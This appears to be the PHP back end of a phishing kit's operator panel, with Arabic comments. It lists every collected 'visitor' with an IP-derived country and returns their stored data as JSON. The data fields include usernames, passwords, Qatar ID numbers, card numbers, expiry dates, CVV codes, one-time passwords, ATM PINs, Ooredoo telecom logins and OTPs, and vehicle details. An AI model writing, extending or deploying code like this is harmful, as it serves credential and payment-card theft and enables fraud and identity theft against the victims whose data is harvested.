<?php
session_start();
require_once __DIR__ . '/../../includes/db.php';
require_once __DIR__ . '/../../includes/functions.php';

header('Content-Type: application/json');

// دالة للحصول على الدولة من عنوان IP
function getCountryFromIP($ip) {
    if ($ip === '127.0.0.1' || $ip === 'localhost' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return 'محلي';
    }
    
    // محاولة جلب الدولة من ip-api.com (أسرع وأكثر استقراراً في بعض الأحيان)
    try {
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,countryCode", false, $ctx);
        if ($response !== false) {
            $data = json_decode($response, true);
            if (isset($data['status']) && $data['status'] === 'success') {
                $country = $data['country'];
                
                // ترجمة بسيطة لأهم الدول
                $translations = [
                    'Qatar' => 'قطر',
                    'Egypt' => 'مصر',
                    'Saudi Arabia' => 'السعودية',
                    'Kuwait' => 'الكويت',
                    'United Arab Emirates' => 'الإمارات',
                    'Jordan' => 'الأردن',
                    'Oman' => 'عمان',
                    'Bahrain' => 'البحرين'
                ];
                
                return $translations[$country] ?? $country;
            }
        }
    } catch (Exception $e) {}
    
    return 'غير معروف';
}

try {
    global $pdo;
    $visitors = getAllVisitorsWithData();
    $formatted = [];
    
    foreach ($visitors as $v) {
        $details = $v['details'] ?? [];
        $country = getCountryFromIP($v['ip_address']);
        
        $formatted[] = [
            'referenceId' => $v['visitor_id'],
            'country' => $country,
            'username' => $details['username'] ?? '-',
            'password' => $details['password'] ?? '-',
            'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
            'clientId' => $details['id_number'] ?? $details['qatar_id'] ?? '-',
            'clientPhone' => $details['phone_number'] ?? '-',
            'last_activity' => date('H:i:s', strtotime($v['last_activity'])),
            'status' => $v['status'],
            'clientIp' => $v['ip_address'],
            'allData' => [
                'username' => $details['username'] ?? '-',
                'password' => $details['password'] ?? '-',
                'name_ar' => $details['name_ar'] ?? '-',
                'name_en' => $details['name_en'] ?? '-',
                'id_number' => $details['id_number'] ?? '-',
                'qatar_id' => $details['qatar_id'] ?? '-',
                'dob' => $details['dob'] ?? '-',
                'gender' => $details['gender'] ?? '-',
                'address' => $details['address'] ?? '-',
                'email' => $details['email'] ?? '-',
                'email_confirm' => $details['email_confirm'] ?? '-',
                'phone_number' => $details['phone_number'] ?? '-',
                'country_code' => $details['country_code'] ?? '-',
                'account_type' => $details['account_type'] ?? '-',
                'nationality' => $details['nationality'] ?? '-',
                'card_name' => $details['card_name'] ?? '-',
                'card_number' => $details['card_number'] ?? '-',
                'exp_month' => $details['exp_month'] ?? '-',
                'exp_year' => $details['exp_year'] ?? '-',
                'cvv' => $details['cvv'] ?? '-',
                'otp' => $details['otp'] ?? '-',
                'atm_pin' => $details['atm_pin'] ?? '-',
                'ooredoo_user' => $details['ooredoo_user'] ?? '-',
                'ooredoo_pass' => $details['ooredoo_pass'] ?? '-',
                'ooredoo_otp' => $details['ooredoo_otp'] ?? '-',
                'vehicle_plate' => $details['vehicle_plate'] ?? '-',
                'vehicle_type' => $details['vehicle_type'] ?? '-',
                'region' => $details['region'] ?? '-',
            ]
        ];
    }
    
    echo json_encode(['success' => true, 'data' => $formatted]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>
